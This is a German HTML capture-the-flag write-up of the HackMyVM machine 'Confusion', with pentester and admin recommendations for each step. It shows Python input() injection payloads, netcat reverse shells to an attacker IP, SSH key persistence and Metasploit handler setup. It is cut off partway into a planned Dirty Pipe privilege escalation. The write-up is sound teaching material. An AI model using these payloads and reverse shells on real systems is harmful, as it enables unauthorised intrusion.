@@ -1,0 +1,630 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confusion - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Confusion - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access (via Python Input Injection)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (via Dirty Pipe)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.109	08:00:27:be:2c:84	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu identifizieren. Es wird ein Host mit der IP <code>192.168.2.109</code> und einer MAC-Adresse von Oracle VirtualBox gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Detaillierten Portscan auf die Ziel-IP durchführen.<br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkaktivität.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.109</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ <span class="password">No web server found on 192.168.2.109:80</span>
+---------------------------------------------------------------------------
++ 0 host(s) tested
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein erster Scan mit Nikto auf Port 80 ergibt, dass dort kein Standard-Webserver läuft. Dies ist eine wichtige erste Erkenntnis, da Port 80 oft ein primäres Ziel ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Schließt einen Standard-Webserver auf Port 80 aus. Weitere Ports müssen untersucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen vollständigen Portscan mit Nmap durchführen, um alle offenen Ports zu finden.<br><strong>Empfehlung (Admin):</strong> Gut, wenn kein Webserver benötigt wird. Sicherstellen, dass keine unnötigen Dienste laufen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.109 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 23:06 CET
+Nmap scan report for confusion (192.168.2.109)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+<span class="command">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey: ...
+<span class="command">32145/tcp open  unknown</span>
+| fingerprint-strings:
+|   GenericLines:
+|     Welcome To The My Magic World
+|     How many times you want to ping?: Traceback (most recent call last):
+|     File "/opt/ping.py", line 7, in <module>
+|     no_of_packets = int(input("How many times you want to ping?: "))
+|     File "<string>", line 0
+|     SyntaxError: unexpected EOF while parsing
+|   GetRequest:
+|     Welcome To The My Magic World
+|     How many times you want to ping?: Traceback (most recent call last):
+|     File "/opt/ping.py", line 7, in <module>
+|     no_of_packets = int(input("How many times you want to ping?: "))
+|     File "<string>", line 1, in <module>
+|     <span class="password">NameError: name 'GET' is not defined</span>
+|   HTTPOptions, RTSPRequest:
+|     Welcome To The My Magic World
+|     How many times you want to ping?: Traceback (most recent call last):
+|     File "/opt/ping.py", line 7, in <module>
+|     no_of_packets = int(input("How many times you want to ping?: "))
+|     File "<string>", line 1, in <module>
+|     <span class="password">NameError: name 'OPTIONS' is not defined</span>
+|   NULL:
+|     Welcome To The My Magic World
+|_    How many times you want to ping?:
+1 service unrecognized despite returning data...
+[...]
+MAC Address: 08:00:27:BE:2C:84 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms confusion (192.168.2.109)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (-sS, -sC, -T5, -A, -p-) identifiziert zwei offene Ports:
+                <ul>
+                    <li>Port <code>22</code>: OpenSSH 8.4p1 (Debian). Standard-SSH-Dienst.</li>
+                    <li>Port <code>32145</code>: Ein unbekannter Dienst. Nmap's Service-Fingerprinting (`fingerprint-strings`) liefert wertvolle Hinweise:
+                        <ul>
+                            <li>Der Dienst gibt "Welcome To The My Magic World" aus und fragt "How many times you want to ping?: ".</li>
+                            <li>Es wird ein Python-Traceback aus `/opt/ping.py` angezeigt, der auf die Verwendung der `input()`-Funktion hindeutet.</li>
+                            <li>Wenn Nmap HTTP-ähnliche Anfragen sendet (z.B. `GET`, `OPTIONS`), versucht die `input()`-Funktion diese als Python-Code zu interpretieren, was zu einem `NameError` führt.</li>
+                        </ul>
+                    </li>
+                </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Port 22 ist ein Standard-Login-Punkt. Der Dienst auf Port 32145 ist der Schlüssel. Die Tracebacks zeigen, dass er ein Python-Skript ist, das `input()` verwendet, um Benutzereingaben zu lesen. Die Verwendung von `input()` in Python 2/3 (insbesondere in älteren Versionen oder wenn nicht korrekt behandelt) kann gefährlich sein, da es versucht, die Eingabe als Python-Code auszuwerten, was zu Code Injection führen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dem Dienst auf Port 32145 manuell interagieren (z.B. via `telnet` oder `nc`). Versuchen, gültige Python-Befehle einzugeben, um die vermutete Code-Injection-Schwachstelle auszunutzen.<br><strong>Empfehlung (Admin):</strong> Benutzerdefinierte Netzwerkdienste sorgfältig entwickeln und absichern. **Niemals** die `input()`-Funktion (oder `eval()`) direkt auf Netzwerk- oder Benutzereingaben anwenden. Stattdessen sichere Methoden zur Eingabeverarbeitung (z.B. `sys.stdin.readline()` für rohe Strings) und Validierung verwenden. Tracebacks sollten nicht an den Client gesendet werden.</p>
+
+            <p class="analysis"><strong>Analyse (Web-Zugriff Versuch):</strong> Ein Versuch, die Adresse `http://192.168.2.109:32145` im Browser zu öffnen, führt ebenfalls zu einem `NameError`, da der Browser eine HTTP GET-Anfrage sendet, die vom `input()` des Python-Skripts nicht verarbeitet werden kann.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Ausgabe bei Browserzugriff (aus Nmap-Scan entnommen) -->
+                    <pre>
+Welcome To The My Magic World
+
+How many times you want to ping?: Traceback (most recent call last):
+  File "/opt/ping.py", line 7, in <module>
+    no_of_packets = int(input("How many times you want to ping?: "))
+  File "<string>", line 1, in <module>
+NameError: name 'GET' is not defined
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Verhalten des Dienstes und die Interpretation von HTTP-Anfragen als ungültigen Python-Code durch `input()`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Direkte Interaktion via `telnet` oder `nc` ist notwendig.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur Absicherung des Dienstes.</p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (via Python Input Injection)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Basierend auf den Nmap-Ergebnissen wird eine Telnet-Verbindung zum Dienst auf Port 32145 aufgebaut, um direkt mit dem Python-Skript zu interagieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.109 32145</span></div>
+                    <pre>
+Trying 192.168.2.109...
+Connected to 192.168.2.109.
+Escape character is '^]'.
+Welcome To The My Magic World
+
+How many times you want to ping?: <span class="command">2</span>
+PING localhost(localhost (::1)) 56 data bytes <!-- IPv6 localhost ping -->
+64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.036 ms
+64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.028 ms
+
+Connection closed by foreign host.
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine erste Interaktion mit einer gültigen Zahl (`2`) als Eingabe führt dazu, dass das Skript `ping localhost` zweimal ausführt und die Verbindung dann schließt. Dies bestätigt die Grundfunktionalität des Skripts.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt das erwartete Verhalten bei gültiger numerischer Eingabe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun versuchen, Python-Code einzuschleusen.<br><strong>Empfehlung (Admin):</strong> Eingaben validieren (nur Zahlen erlauben).</p>
+
+            <p class="analysis"><strong>Proof of Concept: Python Code Injection via input()</strong><br>
+            Der folgende Schritt demonstriert die Ausnutzung der Schwachstelle, indem gültiger Python-Code an die `input()`-Funktion übergeben wird.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.109 32145</span></div>
+                    <pre>
+Trying 192.168.2.109...
+Connected to 192.168.2.109.
+Escape character is '^]'.
+Welcome To The My Magic World
+
+How many times you want to ping?: <span class="command">eval('__import__("os").system("id")')</span>
+<span class="password">uid=1002(iamroot) gid=1002(iamroot) groups=1002(iamroot)</span>
+PING localhost(localhost (::1)) 56 data bytes
+Connection closed by foreign host.
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Diesmal wird als Eingabe der String `eval('__import__("os").system("id")')` gesendet. Da `input()` in diesem Kontext versucht, die Eingabe als Python-Code auszuwerten, wird die `eval()`-Funktion ausgeführt. Diese wiederum importiert das `os`-Modul und führt die Methode `system("id")` aus. Die Ausgabe `uid=1002(iamroot)...` erscheint *vor* dem erwarteten Ping, was die erfolgreiche Ausführung des `id`-Befehls als Benutzer `iamroot` bestätigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritische Schwachstelle (Remote Code Execution)!** Die Verwendung von `input()` ermöglicht es, beliebigen Python-Code und damit beliebige Betriebssystembefehle im Kontext des Benutzers `iamroot` auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese RCE-Schwachstelle nutzen, um weitere Informationen zu sammeln und eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Den Dienst sofort deaktivieren und korrigieren. **Niemals** `input()` oder `eval()` für Netzwerk- oder Benutzereingaben verwenden.</p>
+
+             <!-- Weitere Enumeration über die RCE -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.109 32145</span></div>
+                    <pre>
+[...]
+How many times you want to ping?: <span class="command">eval('__import__("os").system("ls /home")')</span>
+<span class="password">iamroot  sammy	still</span>
+PING localhost(localhost (::1)) 56 data bytes
+Connection closed by foreign host.
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.109 32145</span></div>
+                    <pre>
+[...]
+How many times you want to ping?: <span class="command">eval('__import__("os").system("ls /home/sammy")')</span>
+<span class="password">user.txt</span>
+PING localhost(localhost (::1)) 56 data bytes
+Connection closed by foreign host.
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.109 32145</span></div>
+                    <pre>
+[...]
+How many times you want to ping?: <span class="command">eval('__import__("os").system("cat /home/sammy/user.txt")')</span>
+<span class="password">cat: /home/sammy/user.txt: Permission denied</span>
+[...]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Über die RCE-Schwachstelle werden weitere Befehle ausgeführt: `ls /home` zeigt die Benutzer `iamroot`, `sammy` und `still`. `ls /home/sammy` zeigt eine `user.txt`. Der Versuch, `user.txt` als `iamroot` zu lesen, scheitert jedoch mit "Permission denied".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl wir Code als `iamroot` ausführen, hat dieser Benutzer anscheinend keine Leseberechtigung für die `user.txt` im Home-Verzeichnis von `sammy`. Dies deutet auf eine ungewöhnliche Rechtekonstellation oder darauf hin, dass `iamroot` kein privilegierter Benutzer im Sinne von Root ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine interaktive Shell erhalten, um die Berechtigungen und die Umgebung von `iamroot` genauer zu untersuchen. Die `sudo -l`-Ausgabe prüfen.<br><strong>Empfehlung (Admin):</strong> Berechtigungen für Home-Verzeichnisse korrekt setzen.</p>
+
+             <!-- Reverse Shell -->
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.109 32145</span></div>
+                    <pre>
+[...]
+How many times you want to ping?: <span class="command">eval('__import__("os").system("nc -e /bin/bash 192.168.2.121 8005")')</span>
+[...]
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 8005</span></div>
+                    <pre>
+listening on [any] 8005 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.109] 54052</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Über die RCE wird ein `nc`-Befehl ausgeführt, um eine Reverse Shell zur Angreifer-IP (`192.168.2.121`) auf Port `8005` zu starten. Der Netcat-Listener auf der Angreiferseite empfängt die Verbindung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Eine interaktive Shell als Benutzer `iamroot` wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren und mit der Enumeration fortfahren.<br><strong>Empfehlung (Admin):</strong> RCE-Schwachstelle beheben.</p>
+
+             <!-- Shell Stabilisierung -->
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf Angreifer Maschine, nach Erhalt der Shell -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 8005</span></div>
+                    <pre>
+listening on [any] 8005 ...
+connect to [192.168.2.121] from (UNKNOWN) [192.168.2.109] 54052
+<span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="prompt">iamroot@confusion:/$</span> <span class="command">export TERM=xterm</span>
+export TERM=xterm
+<span class="prompt">iamroot@confusion:/$</span> <span class="command">^Z</span>
+zsh: suspended  nc -lvnp 8005
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -lvnp 8005
+                     <span class="command">reset</span>
+<span class="prompt">iamroot@confusion:/$</span>
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Standardprozedur zur Stabilisierung der Netcat-Reverse-Shell wird angewendet (Python PTY, TERM setzen, stty raw -echo, fg, reset).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine stabile, interaktive Shell als `iamroot` steht zur Verfügung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun `sudo -l` und weitere Enumeration durchführen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">iamroot@confusion:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for iamroot on confusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User iamroot may run the following commands on confusion:
+    <span class="password">(!root) NOPASSWD: /bin/bash</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Ausgabe von `sudo -l` für den Benutzer `iamroot` zeigt eine interessante Regel: `(!root) NOPASSWD: /bin/bash`. Das bedeutet, `iamroot` kann `/bin/bash` als jeder beliebige Benutzer *außer* `root` ohne Passwort ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine ungewöhnliche sudo-Regel. Sie verhindert die direkte Eskalation zu `root` mittels `sudo -u root /bin/bash` oder `sudo -u#0 /bin/bash`. Sie erlaubt jedoch das Wechseln zu *jedem anderen* Benutzer. Dies könnte für horizontale Bewegung nützlich sein, aber nicht direkt für die Root-Eskalation über diesen Weg.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Regel ist keine direkte Hilfe für Root. Nach anderen Vektoren suchen (Kernel-Exploits, SUID-Binaries, Cronjobs, Fehlkonfigurationen).<br><strong>Empfehlung (Admin):</strong> Solche `sudo`-Regeln sind verwirrend und potenziell gefährlich. `sudo` sollte nur für spezifische, notwendige Befehle und Zielbenutzer gewährt werden. Die `!root`-Einschränkung ist ungewöhnlich und sollte hinterfragt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">iamroot@confusion:~$ <span class="command">ss -tulpe</span></div>
+                    <pre>
+Netid  State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port  Process
+udp    UNCONN   0        0                0.0.0.0:bootpc          0.0.0.0:*      ino:11704 sk:1 cgroup:/system.slice/ifup@enp0s3.service <->
+tcp    LISTEN   0        5                0.0.0.0:32145           0.0.0.0:*      users:(("socat",pid=393,fd=5)) uid:1002 ino:11717 sk:2 cgroup:/system.slice/special_ping.service <->
+tcp    LISTEN   0        128              0.0.0.0:ssh             0.0.0.0:*      ino:11747 sk:3 cgroup:/system.slice/ssh.service <->
+tcp    LISTEN   0        128                 [::]:ssh                [::]:*      ino:11758 sk:4 cgroup:/system.slice/ssh.service v6only:1 <->
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `ss -tulpe` zeigt die laufenden Dienste. Interessant ist, dass der Dienst auf Port 32145 durch `socat` (PID 393) ausgeführt wird und zur CGroup `special_ping.service` gehört. Er läuft als UID 1002 (`iamroot`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der anfällige Dienst als `iamroot` läuft und durch `socat` bereitgestellt wird, was wahrscheinlich das Python-Skript `/opt/ping.py` startet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Konfiguration des `special_ping.service` (Systemd-Unit-Datei) untersuchen, um mehr über den Startmechanismus zu erfahren.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass Dienste wie `socat` nicht unnötig verwendet werden, um Skripte über das Netzwerk verfügbar zu machen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">iamroot@confusion:~$ <span class="command">find / -perm -4000 -exec ls -al {} \; 2>/dev/null</span></div>
+                    <pre>
+-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 35040 Jul 28  2021 /usr/bin/umount
+-rwsr-xr-x 1 root root 71912 Jul 28  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 55528 Jul 28  2021 /usr/bin/mount
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
+-rwsr-xr-x 1 root root 182600 Feb 27  2021 /usr/bin/sudo
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Suche nach SUID-Binaries. Die Liste zeigt Standard-Binaries für Debian 11. Es gibt keine offensichtlich ungewöhnlichen oder leicht ausnutzbaren SUID-Dateien (abgesehen von `sudo`, das aber eingeschränkt ist).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> SUID-Exploits scheinen kein einfacher Weg zu sein. Der Fokus sollte auf Kernel-Exploits oder anderen Fehlkonfigurationen liegen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kernel-Version prüfen und nach bekannten Exploits suchen.<br><strong>Empfehlung (Admin):</strong> System aktuell halten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">iamroot@confusion:~$ <span class="command">cat /etc/*-release</span></div> <!-- Korrektur: *-release statt -release -->
+                    <pre>
+PRETTY_NAME="<span class="command">Debian GNU/Linux 11 (bullseye)</span>"
+NAME="Debian GNU/Linux"
+VERSION_ID="11"
+VERSION="11 (bullseye)"
+VERSION_CODENAME=bullseye
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bestätigt das Betriebssystem als Debian 11 (Bullseye).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtig für die Exploit-Suche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kernel-Version mit `uname -a` ermitteln.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">iamroot@confusion:~$ <span class="command">cat /etc/apt/note.txt</span></div>
+                    <pre>
+Have You Checked Other Port?
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Notizdatei in `/etc/apt` enthält einen Hinweis. Da wir bereits über Port 32145 eingestiegen sind, ist die Bedeutung unklar. Evtl. ein Überbleibsel oder eine falsche Fährte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vage Notiz, wahrscheinlich nicht direkt nützlich für die Eskalation an dieser Stelle.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiz zur Kenntnis nehmen, aber nicht zu viel Zeit darauf verwenden, wenn andere Wege (Kernel-Exploit) vielversprechender sind.<br><strong>Empfehlung (Admin):</strong> Unnötige Notizdateien entfernen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf Ziel als iamroot -->
+                    <div class="prompt">iamroot@confusion:~$ <span class="command">echo "ssh-rsa AAAAB3N...(Key)...zxE=" > ~/.ssh/authorized_keys</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der SSH-Schlüssel des Angreifers wird in die `authorized_keys`-Datei von `iamroot` geschrieben, um einen stabilen SSH-Zugang zu ermöglichen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Sinnvoller Schritt für stabilen Zugriff.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SSH-Verbindung testen.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Angreifer Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh iamroot@mess.hmv</span></div> <!-- Hostname 'mess.hmv' statt 'confusion.hmv' im Original? -->
+                    <pre>
+The authenticity of host 'mess.hmv (192.168.2.109)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+[...]
+Have you ever thought?
+     If
+ Cindrella's
+   Shoe Fit
+  Perfectly
+   Then Why
+  Did It Fall
+    Off?
+still:confused?
+Then go for Port 32145 :)
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">(Passphrase eingegeben)</span>
+Linux confusion 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...]
+Last login: Mon Oct 24 17:19:26 2022 from 192.168.2.153
+<span class="password">iamroot@confusion:~$</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als `iamroot` mittels Schlüssel gelingt. Eine interessante MOTD/Banner wird angezeigt, die auf die Maschine "Confusion" und Port 32145 hinweist. Die Kernel-Version wird als `5.10.0-9-amd64` (Debian 5.10.70-1) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Stabiler SSH-Zugang als `iamroot` ist etabliert. Die Kernel-Version 5.10.70 ist bekannt dafür, anfällig für die Dirty Pipe-Schwachstelle (CVE-2022-0847) zu sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Dirty Pipe-Schwachstelle zur Eskalation zu Root ausnutzen.<br><strong>Empfehlung (Admin):</strong> Kernel auf eine gepatchte Version aktualisieren.</p>
+
+            <p class="analysis"><strong>Proof of Concept: Privilege Escalation via Dirty Pipe (CVE-2022-0847)</strong><br>
+            Die folgenden Schritte nutzen die Metasploit-Framework, um die Dirty Pipe-Schwachstelle auszunutzen.</p>
+
+            <!-- Metasploit Teil -->
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Angreifer Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole</span></div>
+                    <pre>
+[...]
+msf6 >
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                    <pre>[*] Using configured payload generic/shell_reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">options</span></div>
+                    <pre>[...]</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                    <pre>lport => 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.121</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                    <pre>[*] Started reverse TCP handler on 192.168.2.121:4444</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Ziel als iamroot -->
+                     <div class="prompt">iamroot@confusion:~$ <span class="command">nc -e /bin/bash 192.168.2.121 4444</span></div>
+                     <!-- Keine Ausgabe auf Ziel -->
+                  </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Angreifer Maschine / Metasploit -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div> <!-- Redundanter run-Befehl im Original -->
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.121:4444
+[*] <span class="password">Command shell session 1 opened (192.168.2.121:4444 -> 192.168.2.109:36134) at 2022-11-01 23:31:30 +0100</span>
+
+<span class="command">id</span>
+<span class="command">uid=1002(iamroot) gid=1002(iamroot) groups=1002(iamroot)</span>
+^Z
+Background session 1? [y/N]  y
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use post/multi/manage/shell_to_meterpreter</span></div> <!-- Index 54 -->
+                    <pre>[...]</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set HANDLER true</span></div>
+                    <pre>HANDLER => true</pre>
